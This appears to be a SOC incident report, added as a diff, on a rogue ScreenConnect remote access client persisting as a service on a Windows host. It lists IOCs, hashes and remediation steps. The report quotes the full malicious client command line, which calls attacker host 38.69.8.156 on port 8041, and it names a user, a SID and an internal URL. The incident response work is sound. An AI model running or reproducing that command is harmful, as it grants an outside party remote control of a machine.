@@ -1,0 +1,81 @@
+Investigative Summary:
+----------------------
+Since this is a newly onboarded host, this is likely from a previous incident as "ScreenConnect Client (6100c8e237f6b876)" appears to have been on the host since 2024 as indicated by its creation time in directory: 'C:\Program Files (x86)\ScreenConnect Client (6100c8e237f6b876)'
+
+At 2026-01-08 15:20:11 UTC, a Windows Service with the name "ScreenConnect Client (6100c8e237f6b876)" was detected on the endpoint. Evidence indicates prior to this host having the Huntress agent installed, there was a malicious ScreenConnect instance on the host which reaches out to domain: 38[.]69[.]8[.]156 over port 8041. Huntress also observes there were active IP addresses communicating via port 8041, which were 50[.]225[.]154[.]136 and 38[.]69[.]8[.]156.
+
+ScreenConnect is a legitimate remote access tool used by IT professionals for support and management, and because it gives full remote control it can be very useful for authorized administration. However, its same remote access capabilities are frequently leveraged by threat actors—whether via compromised accounts, phishing lures, or trojanized installers—to gain unauthorized control of systems once inside a network. Because of this dual-use nature, its deployment and use should always be authorized and monitored.
+
+We recommend immediately scanning the affected host for additional malware, reviewing network logs for connections to "50[.]225[.]154[.]136 and 38[.]69[.]8[.]156", adding these IPs to your organization's firewall blacklist, and providing security awareness training to the user regarding social engineering tactics. The user's credentials should be considered potentially compromised and may require reset depending on the payload's capabilities. It is recommended to reimage the host from known-good media for full remediation. 
+
+This host has been isolated to prevent further ingress.
+
+Please refer to remediation tasks for next steps. 
+
+IOCs:
+
+IP(s):
+50[.]225[.]154[.]136
+38[.]69[.]8[.]156
+
+User Account -
+-----------------------
+User Account: Dennis Dix
+SID: S-1-5-21-184956874-936332180-3969231667-1002
+
+Host Details - 
+-----------------------
+Host Name: 	ATN82911
+IP: 192.168.10.100
+
+File System -
+-----------------------
+FILE: C:\Program Files (x86)\ScreenConnect Client (6100c8e237f6b876)\ScreenConnect.WindowsClient.exe
+SHA256: 600cf10e27311e60d32722654ef184c031a77b5ae1f8abae8891732710afee31
+
+Process: "WScript.exe"
+- File Path: "C:\WINDOWS\System32\WScript.exe"
+- Command Line: "C:\WINDOWS\System32\WScript.exe" "C:\Users\Dennis Dix\OneDrive\Documents\ConnectWiseControl\Temp\windows update.vbs"
+NOTE: SHA256 has unable to be retrieved as file is no longer on host. 
+
+Persistence -
+-----------------------
+Persistence: Service (Own Process) - ScreenConnect Client (6100c8e237f6b876)
+- Name: "ScreenConnect Client (6100c8e237f6b876)"
+- File Path: ""c:\program files (x86)\screenconnect client (6100c8e237f6b876)\screenconnect.clientservice.exe" "?e=access&y=guest&h=38[.]69[.]8[.]156&p=8041&s=6c145ff7..."
+- SHA256: "f1b5c000794f046259121c63ed37f9eff0cfe1258588eca6fd85e16d3922767e"
+
+Threat Descriptions:
+--------------------
+Rogue ScreenConnect: Huntress has been tracking a number of malicious threat actors convincing users via email into running malicious ScreenConnect (ConnectWise Control) installers that give the threat actor remote access to the host. 
+
+Malicious Remote Management Tool: A legitimate remote management tool has been misused by a threat actor to gain unauthorized access and control of the reported endpoint. Threat actors do this to hide their presence, maintain persistence and further exploit the network.
+
+Persistence : Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.
+
+Prior Compromise: The security incident on this host occurred prior to the Huntress agent installation. We will attempt to address any observed malicious behavior, but there may be unreported changes to this host that will not be detected due to limited telemetry.
+
+Remediations:
+-------------
+Assisted Remediations provided by the Huntress SOC to remediate the incident. These can be executed automatically in the Huntress Platform:
+- Kill Process - path: C:\WINDOWS\System32\WScript.exe + pid: 18884
+- Delete Service - name: ScreenConnect Client (6100c8e237f6b876)
+- Delete Registry Key - key: HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (6100c8e237f6b876)
+- Delete File - path: c:\program files (x86)\screenconnect client (6100c8e237f6b876)\screenconnect.clientservice.exe + sha256: f1b5c000794f046259121c63ed37f9eff0cfe1258588eca6fd85e16d3922767e
+- Reboot the Host - remediation: A reboot is required to complete the remediation plan
+
+Manual Remediations provided by the Huntress SOC are highly recommended remediation actions to be conducted by your team before resolving the incident in the Huntress Platform:
+- Enroll the user in a security awareness training session to reinforce safe practices in the corporate environment.
+- Reimage or restore to a clean baseline if the compromise is extensive or trust in device integrity can't be restored.
+- Audit affected directories/files for additional suspicious files and remove those found. 
+
+All remediations provided can be found in the Huntress Platform: Incident Report: https://tabinc.huntress.io/org/573692/infection_reports/1876640#remediations-tab
+
+Lead Signal Information:
+------------------------
+Signal Name: Screenconnect Url Not Hosted
+Detected At: 2026-01-08 15:19:49 UTC
+Service Display Name: ScreenConnect Client (6100c8e237f6b876)
+Service Name: ScreenConnect Client (6100c8e237f6b876)
+Command: "C:\Program Files (x86)\ScreenConnect Client (6100c8e237f6b876)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=38.69.8.156&p=8041&s=6c145ff7-9857-4f33-b5ff-09d0daa2c411&k=BgIAAACkAABSU0ExAAgAAAEAAQDJPX0cDgJF5aHenyRUiIUZ0TLx61Q%2f5ltn2d0egxLlG6JYA49q7NBup%2fDeYFSTcVO0R1eisXFqkepFFAZM1%2bKrmXTQYPRTgiWjKZJ4d%2bBSYg00Uk%2bVXeTid4%2bbZR2VLQe23TACBqF3piqm3B%2bUhFlAVYyA5AhJB3fu2QsHzwYkLtam2RG%2bqcZuvMkZJ5wgxSHPmlMLhLg5TVjkmkfTvvpTUvGjFl5MNs3HpQnsbRaKAgxEBsyGrhU92H38qBQUg%2f5dFaqgDKcZ1fbnBqcz%2fkaEDgZx2Hlp63P1FP3KA4OSfcF1bVdHeWdVvw1KqeqgrGwz1h16nKQYEs43wEPI0v7a&v=AQAAANCMnd8BFdERjHoAwE%2fCl%2bsBAAAAoTdEMYXpxUGG4pGugtD5nAAAAAACAAAAAAAQZgAAAAEAACAAAAAn3d0g81F%2beT9WSOe4mtXx1zpE%2fV5TMMRkPCuYHqbaAgAAAAAOgAAAAAIAACAAAAD4EPPYiFLkiRG%2bZTNmZ9oHfKT%2b6Xb5kwxp0aODFlbO8qAEAAB0MmL72Ue7YZZ%2fCSE4n429dm%2bHLgl6AFD6dIcOAro%2fW%2bP9kDykFV8NU5t0puAONlE10Y2jC2FFDh%2fzBlZHNAJSCO8Z8Wm0YKL6utgcBJkTYj2KUXHBmNSih2C6WeazJvY7PyzA%2fKqOrJpW1lQDhoDuVUpEs9XICBCCqKWbauNQggxAWh17WvPOPSnmLQe%2f3h4u1mHCxSOOIChpZqXiwEpX0d7XWITogb5ZiHsyCpKc6sPEYXiIZMC%2bMsxABx4YZjWjp4yAaRvRbdZmL3S%2bdVRg05lOSSaI0qh%2fSFNKShApUtUWlrvi1tLHX4%2btxeV1KTVbWLe8W%2f88MJG9NE1aE43fq20kJzFyv0%2fHyZAopbAxKzCjZ0y8XVlB0vBmZnluqnvzQqmc38G%2bI5YhXdjTOerxYsZdGvQatvKrpHR8Si6ZMVyiQJ7biIkpemh2mqgQhPNxShT4Z0EanFv0M7sddH%2fD2zaWdKQFy%2bjMc%2fUa6pqAZAWHHWgaD3bLWTHXZ7r3Do9hUkVeHW6CFk9dthMPQjP26QO8CzIC%2bx9Z7HVaJeVKtQJtwdkxvBBDkaZYLQaYywMQZf0fXBEdAWdu9Cd%2bKVdWQVe8lmlknh%2f7oJeC7FVndD7Z05tK3FWqc9LVs6cq61%2f3isZRaaZqSA4J9VOOYyozHS3lo0PiZCiwigoRbUNS9FxIRTKFTj32rP%2b7h3hONW1GZuj5i92J8ywbqF3S4S%2fVtCqWBSg43Je0vysyVNUql33xM2zu7jwYyXGAkOFGu%2bf4bexn42WrHECYPIZ%2fQK4QAzQW1biY6xtGHUIRd65GUBQMSio0T%2bnWAIfW1F0DLLRLoRHLpA%2bW3kw9vqfFUGAFpPnLBIq8Ynt2%2fOnsFJ3h9reW7YNw3AtfeQX3rImrKx66ULEzcnZR%2bHUzcjp6iJLv7XAKKZDOzzYlaFDb1PIvb%2b%2f7HtWHq8kl4Tm%2bEvCBPB%2bI6bMnVxVz8CiAGk0QguIiQnrQu7MEn1PyJHZgPBUUJqNeW3UnyR4f4RH3fR6F1vslJe2kIDZndBWPqqpE9RoXB4qAYVB6R7NqxGt05f5Bd1lP3hCFTK9KAATyH18xn0OU7zrb01hLJe2vgNHnFH2QeCm8fiB4l7KJvidULJ5EvQWSmMEMh224t5o2SQ8CA6X3IKgxwJaX%2fOc0prbZIsYFwnPemzerrS%2bubW%2frxhPNbAFafANz%2f02%2f37NmBHMo36PLjZV7INwz9wu5RgpU%2fQhEwmuTmsYCjmcvsVMv6ajuQpG5h%2bEXWdHCbEdbGa6w4xTrUCzfrqM5eC%2bLsu%2bwUKqzBdZyJyHrXcFtdkwtyHr3E08Gr04G5p7aXpgivCzjhIFfFGd7uHdHvLDnbAynbYgXS3AWp5AaVrYvwAZlA0FoILfGr9MFK1wo2fYsdAwVRusNM0clOX6sp%2fprg3pyzSecfaad%2f%2boPowV%2bOibGjN%2f212uGCh5qrbVBeayKaDXoaDhkQTznsaButUm12IEqiZtX2TCoVVcmLGtZJ%2bvMRmwiCfjk7ayweHI%2bVWBbuUlec2JzDJT46RAJg3Ta%2fon7CofWY6lEIjv03HuBKb4ghpv4okAAAAAr1aqX1ebiNpfyeEN2rrvzJBGkQOkGDSn0vBrmmDcsqF3WNCjOtLCX21L8Yz5TmVBJiWHgkCRsy%2bmjfnp0hgo7"
+File Path: c:\program files (x86)\screenconnect client (6100c8e237f6b876)\screenconnect.clientservice.exe
